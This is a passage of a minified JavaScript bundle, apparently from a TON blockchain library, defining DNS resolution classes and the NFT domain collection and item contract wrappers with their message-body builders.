        createSignatureCell: o,
        tag_init: h,
        tag_cooperative_close: c,
        tag_cooperative_commit: u,
        tag_start_uncooperative_close: d,
        tag_challenge_state: f,
        tag_settle_conditionals: p,
        tag_state: w,
        op_top_up_balance: C,
        op_init_channel: g,
        op_cooperative_close: y,
        op_cooperative_commit: m,
        op_start_uncooperative_close: B,
        op_challenge_quarantined_state: A,
        op_settle_conditionals: F,
        op_finish_uncooperative_close: E,
        op_channel_closed: b,
        createTopUpBalance: v,
        createInitChannelBody: D,
        createCooperativeCloseChannelBody: M,
        createCooperativeCommitBody: _,
        createConditionalPayment: T,
        createSemiChannelBody: S,
        createSemiChannelState: k,
        createSignedSemiChannelState: x,
        createStartUncooperativeCloseBody: I,
        createChallengeQuarantinedStateBody: U,
        createSettleConditionalsBody: R,
        createFinishUncooperativeClose: N,
        createOneSignature: P,
        createTwoSignature: O,
      };
    },
    8382: function (t, e, r) {
      const n = r(8383).default,
        { DnsCollection: i } = r(8384),
        { DnsItem: s } = r(8385);
      t.exports.default = { Dns: n, DnsCollection: i, DnsItem: s };
    },
    8383: function (t, e, r) {
      const { Cell: n } = r(2917),
        { Address: i, bytesToHex: s } = r(2916),
        {
          DNS_CATEGORY_NEXT_RESOLVER: o,
          DNS_CATEGORY_SITE: a,
          DNS_CATEGORY_WALLET: l,
          DNS_CATEGORY_STORAGE: h,
          createSmartContractAddressRecord: c,
          createAdnlAddressRecord: u,
          createStorageBagIdRecord: d,
          createNextResolverRecord: f,
          parseSmartContractAddressRecord: p,
          parseAdnlAddressRecord: w,
          parseStorageBagIdRecord: C,
          parseSiteRecord: g,
          parseNextResolverRecord: y,
          dnsResolve: m,
        } = r(5284);
      class Dns {
        constructor(t) {
          this.provider = t;
        }
        async getRootDnsAddress() {
          const t = await this.provider.getConfigParam(4),
            e = t.bits.array;
          if (32 !== e.length)
            throw new Error("Invalid ConfigParam 4 length " + e.length);
          const r = s(e);
          return new i("-1:" + r);
        }
        async resolve(t, e, r) {
          const n = await this.getRootDnsAddress();
          return m(this.provider, n.toString(), t, e, r);
        }
        getWalletAddress(t) {
          return this.resolve(t, l);
        }
        getSiteAddress(t) {
          return this.resolve(t, a);
        }
      }
      ((Dns.resolve = m),
        (Dns.createSmartContractAddressRecord = c),
        (Dns.createAdnlAddressRecord = u),
        (Dns.createStorageBagIdRecord = d),
        (Dns.createNextResolverRecord = f),
        (Dns.parseNextResolverRecord = y),
        (Dns.parseAdnlAddressRecord = w),
        (Dns.parseStorageBagIdRecord = C),
        (Dns.parseSiteRecord = g),
        (Dns.parseSmartContractAddressRecord = p),
        (Dns.DNS_CATEGORY_NEXT_RESOLVER = o),
        (Dns.DNS_CATEGORY_WALLET = l),
        (Dns.DNS_CATEGORY_SITE = a),
        (Dns.DNS_CATEGORY_STORAGE = h),
        (t.exports.default = Dns));
    },
    8384: function (t, e, r) {
      const { Contract: n } = r(3061),
        { Cell: i } = r(2917),
        { Address: s } = r(2916),
        { parseAddress: o } = r(3184),
        { dnsResolve: a } = r(5284),
        { parseOffchainUriCell: l } = r(3184);
      class DnsCollection extends n {
        constructor(t, e) {
          if (
            ((e.wc = 0),
            (e.code = e.code),
            super(t, e),
            !e.collectionContent && !e.address)
          )
            throw new Error("required collectionContent cell");
          ((this.methods.getCollectionData = this.getCollectionData.bind(this)),
            (this.methods.getNftItemAddressByIndex =
              this.getNftItemAddressByIndex.bind(this)),
            (this.methods.getNftItemContent =
              this.getNftItemContent.bind(this)),
            (this.methods.resolve = this.resolve.bind(this)));
        }
        createDataCell() {
          const t = new i();
          return (
            (t.refs[0] = this.options.collectionContent),
            (t.refs[1] = i.oneFromBoc(this.options.dnsItemCodeHex)),
            t
          );
        }
        async getCollectionData() {
          const t = await this.getAddress(),
            e = await this.provider.call2(t.toString(), "get_collection_data"),
            r = e[0].toNumber(),
            n = e[1],
            i = l(n);
          return {
            collectionContentUri: i,
            collectionContent: n,
            ownerAddress: null,
            nextItemIndex: r,
          };
        }
        async getNftItemContent(t) {
          const e = await t.getData();
          return e;
        }
        async getNftItemAddressByIndex(t) {
          const e = await this.getAddress(),
            r = await this.provider.call2(
              e.toString(),
              "get_nft_address_by_index",
              [["num", t.toString()]],
            );
          return o(r);
        }
        async resolve(t, e, r) {
          const n = await this.getAddress();
          return a(this.provider, n.toString(), t, e, r);
        }
      }
      t.exports = { DnsCollection: DnsCollection };
    },
    8385: function (t, e, r) {
      const { Contract: n } = r(3061),
        { Cell: i } = r(2917),
        { Address: s, BN: o } = r(2916),
        { parseAddress: a } = r(3184),
        { dnsResolve: l, categoryToBN: h } = r(5284);
      class DnsItem extends n {
        constructor(t, e) {
          ((e.wc = 0),
            (e.code = e.code),
            super(t, e),
            (this.methods.getData = this.getData.bind(this)),
            (this.methods.getDomain = this.getDomain.bind(this)),
            (this.methods.getAuctionInfo = this.getAuctionInfo.bind(this)),
            (this.methods.getLastFillUpTime =
              this.getLastFillUpTime.bind(this)),
            (this.methods.resolve = this.resolve.bind(this)));
        }
        createDataCell() {
          const t = new i();
          return (
            t.bits.writeUint(this.options.index, 256),
            t.bits.writeAddress(this.options.collectionAddress),
            t
          );
        }
        async getData() {
          const t = await this.getAddress(),
            e = await this.provider.call2(t.toString(), "get_nft_data"),
            r = -1 === e[0].toNumber(),
            n = e[1],
            i = a(e[2]),
            s = r ? a(e[3]) : null,
            o = e[4];
          return {
            isInitialized: r,
            index: n,
            collectionAddress: i,
            ownerAddress: s,
            contentCell: o,
          };
        }
        async createTransferBody(t) {
          const e = new i();
          return (
            e.bits.writeUint(1607220500, 32),
            e.bits.writeUint(t.queryId || 0, 64),
            e.bits.writeAddress(t.newOwnerAddress),
            e.bits.writeAddress(t.responseAddress),
            e.bits.writeBit(!1),
            e.bits.writeCoins(t.forwardAmount || new o(0)),
            e.bits.writeBit(!1),
            t.forwardPayload && e.bits.writeBytes(t.forwardPayload),
            e
          );
        }
        createGetStaticDataBody(t) {
          const e = new i();
          return (
            e.bits.writeUint(801842850, 32),
            e.bits.writeUint(t.queryId || 0, 64),
            e
          );
        }
        async getDomain() {
          const t = await this.getAddress(),
            e = await this.provider.call2(t.toString(), "get_domain");
          return new TextDecoder().decode(e.bits.array.buffer);
        }
        async getAuctionInfo() {
          const t = await this.getAddress(),
            e = await this.provider.call2(t.toString(), "get_auction_info"),
            r = a(e[0]),
            n = e[1],
            i = e[2].toNumber();
          return { maxBidAddress: r, maxBidAmount: n, auctionEndTime: i };
        }
        async getLastFillUpTime() {
          const t = await this.getAddress(),
            e = await this.provider.call2(
              t.toString(),
              "get_last_fill_up_time",
            );
          return e.toNumber();
        }
        async resolve(t, e, r) {
          const n = await this.getAddress();
          return l(this.provider, n.toString(), t, e, r);
        }
      }
      ((DnsItem.createChangeContentEntryBody = async (t) => {
        const e = new i();
        return (
          e.bits.writeUint(1320284409, 32),
          e.bits.writeUint(t.queryId || 0, 64),
          e.bits.writeUint(await h(t.category), 256),
          t.value && (e.refs[0] = t.value),
          e
        );
      }),
        (t.exports = { DnsItem: DnsItem }));
    },
  },
]);
